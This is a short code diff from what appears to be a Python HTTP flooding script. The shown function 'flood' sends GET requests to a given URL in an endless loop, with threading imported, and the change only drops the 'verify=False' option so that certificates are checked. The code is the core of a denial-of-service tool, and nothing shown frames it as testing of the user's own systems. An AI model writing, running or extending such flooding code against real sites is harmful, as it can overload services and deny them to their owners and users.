@@ -4,7 +4,7 @@ import threading
 def flood(url):
     while True:
         try:
-            response = requests.get(url, verify=False)
+            response = requests.get(url)
             print(f"Sent request to {url}")
         except requests.exceptions.RequestException as e:
             print(f"Error: {e}")
